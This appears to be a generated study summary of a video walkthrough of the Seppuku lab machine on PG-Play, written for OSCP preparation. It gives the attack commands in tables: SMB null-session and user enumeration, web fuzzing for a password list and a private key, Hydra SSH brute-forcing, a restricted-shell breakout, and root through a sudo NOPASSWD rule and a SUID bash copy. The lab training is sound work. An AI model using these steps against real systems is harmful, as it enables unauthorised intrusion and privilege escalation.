This is a comprehensive breakdown of the methodologies and commands used in the video "Seppuku - Box Walkthrough with S1REN!" which covers a penetration test of the Seppuku machine on PG-Play, a valuable resource for your OSCP preparation.

## 📝 Seppuku Box Walkthrough: Comprehensive Notes and Commands

The walkthrough demonstrates a typical OSCP-style machine involving service enumeration, credential brute-forcing, lateral movement using discovered credentials, and a powerful `sudo` misconfiguration for final privilege escalation.

***

## 1. Initial Enumeration & Foothold

The first phase focused on discovering open services and misconfigurations to gain an initial foothold.

### 🔍 Service Enumeration (Nmap & SMB)

| Step | Command | Finding / Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Nmap Scan** | `nmap -p- -sV -sC $TARGET_IP --open` | Discovered ports: 21 (FTP), 22 (SSH), **139/445 (SMB)**, 80/7080/7601/8088 (HTTP/S). | [[30:08](http://www.youtube.com/watch?v=6FlCUQpASkY&t=1808)] |
| **SMB Share Enum** | `nmap -p139,445 --script=smb-enum-shares $TARGET_IP` | Found shares: `IPC$`, `Print$`, and `Users$`. | [[38:41](http://www.youtube.com/watch?v=6FlCUQpASkY&t=2321)] |
| **Null Session Check** | `smbclient //$TARGET_IP/IPC$` (with no password) | **Critical Finding:** Confirmed **Anonymous (Null) Sessions** are permitted on SMB [[41:33](http://www.youtube.com/watch?v=6FlCUQpASkY&t=2493)], a major security misconfiguration. | [[40:48](http://www.youtube.com/watch?v=6FlCUQpASkY&t=2448)] |
| **User Enumeration** | `enum4linux $TARGET_IP` | **Critical Finding:** Enumerated valid system users: **Samurai, Seppuku, and Tanto**. | [[49:18](http://www.youtube.com/watch?v=6FlCUQpASkY&t=2958)] |

### 🌐 Web Enumeration (Finding Passwords & Keys)

The web surface revealed critical files for credential harvesting.

| Step | Command | Finding / Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Web Fuzzing** | `wfuzz -c -z file,opt/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 $TARGET_URL/FUZZ/` | The tool was used to discover hidden files and directories across all web ports. | [[51:55](http://www.youtube.com/watch?v=6FlCUQpASkY&t=3115)] |
| **Password List** | `curl $TARGET_IP:7601/secret/passwords.list` | Discovered a potential password list in the `/secret/` directory. | [[01:01:09](http://www.youtube.com/watch?v=6FlCUQpASkY&t=3669)] |
| **Private Key** | `curl $TARGET_IP:7601/keys/private.back` | **Critical Finding:** Discovered an **ID\_RSA private key** for the user `tanto`. The key was saved and set with restricted permissions (`chmod 600 id_rsa`). | [[01:15:23](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4523)] |

***

## 2. Lateral Movement

Using the enumerated users and the password list, the initial SSH foothold was gained.

### 🔑 Credential Brute-Force (Hydra)

| Step | Command | Finding / Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **SSH Brute-Force** | `hydra -L users.txt -P passwords.list $TARGET_IP ssh` | **Initial Foothold:** Found credentials for user **seppuku** and gained a shell. | [[01:01:40](http://www.youtube.com/watch?v=6FlCUQpASkY&t=3700)] |
| **Shell Breakout** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Used to break out of the initial restricted shell (`rbash`) and gain a fully interactive TTY shell. | [[01:05:09](http://www.youtube.com/watch?v=6FlCUQpASkY&t=3909)] |
| **Lateral Pivot** | `su samurai` (with discovered password) | Used another found password to move laterally to the user **samurai**. | [[01:07:05](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4025)] |
| **Tanto Access** | `ssh -i id_rsa tanto@127.0.0.1` | Used the discovered ID\_RSA key to SSH into the loopback address as user **tanto**. | [[01:15:53](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4553)] |

***

## 3. Vertical Privilege Escalation (Root)

The path to root was found by exploiting a dangerous `sudo` rule set for the `samurai` user.

### 🛡️ Exploiting Sudo Misconfiguration

| Step | Command | Finding / Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Check Sudo** | `sudo -l` (as **samurai**) | **Critical Finding:** User `samurai` can run the binary `/home/tanto/.cgi-bin/ben` as any user (`ALL`) with no password (`NOPASSWD`), and it accepts arguments targeting `/tmp/*`. | [[01:07:18](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4038)] |
| **Create Binary Directory** | *Performed as **tanto***: `mkdir -p /home/tanto/.cgi-bin` | The directory for the malicious payload was created using the `tanto` shell. | [[01:18:41](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4721)] |
| **Create Malicious Payload** | *Performed as **tanto***: `nano /home/tanto/.cgi-bin/ben` | A script was created to copy the `/bin/bash` binary to `/var/temp/dash` and set the **SUID (Set User ID) bit** on it, forcing it to always run as `root`. | [[01:19:03](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4743)] |
| **Set Executable Bit** | *Performed as **tanto***: `chmod +x /home/tanto/.cgi-bin/ben` | Made the newly created payload executable, which was a critical step for the exploit to work. | [[01:22:04](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4924)] |
| **Execute Sudo Command** | *Performed as **samurai***: `sudo /home/tanto/.cgi-bin/ben /tmp/` | Executed the malicious binary with `sudo` privileges. This ran the script as **root**, creating the SUID bash shell. | [[01:22:22](http://www.youtube.com/watch?v=6FlCUQpASkY&t=4942)] |
| **Get Root Shell** | `/var/temp/dash -p` | Executed the SUID binary with the `-p` flag to maintain effective root privileges. | [[01:24:46](http://www.youtube.com/watch?v=6FlCUQpASkY&t=5086)] |
| **Confirm Root** | `whoami` | **Result:** **Root Access Gained.** | [[01:25:02](http://www.youtube.com/watch?v=6FlCUQpASkY&t=5102)] |

***

## 💡 Key Takeaway Concepts for OSCP

* **Enumeration is Key:** The path to root depended on discovering **three** separate findings from different services: **valid usernames (SMB)**, **a password list (Web Fuzzing)**, and **an SSH key (Web Fuzzing)**.
* **Avoid Rabbit Holes:** The video highlighted files like `shadow.back` and the `rabbit hole` user [[01:00:24](http://www.youtube.com/watch?v=6FlCUQpASkY&t=3624)]. Don't spend excessive time on findings that don't match confirmed system information (e.g., users found via `enum4linux`).
* **SMB Null Sessions are Dangerous:** Allowing null sessions easily exposes user account names, which drastically simplifies brute-forcing [[01:26:43](http://www.youtube.com/watch?v=6FlCUQpASkY&t=5203)].
* **Check `sudo -l` Carefully:** The privilege escalation was successful because a user had `NOPASSWD` permission on a custom binary that could be manipulated by another low-privilege user (`tanto`) through a common directory location (`/home/tanto/.cgi-bin/`). This is a classic misconfiguration.
* **The SUID Exploit:** Setting the SUID bit (`chmod u+s`) on `/bin/bash` is a powerful technique to permanently establish a root shell from an unprivileged SUID execution.

http://googleusercontent.com/youtube_content/0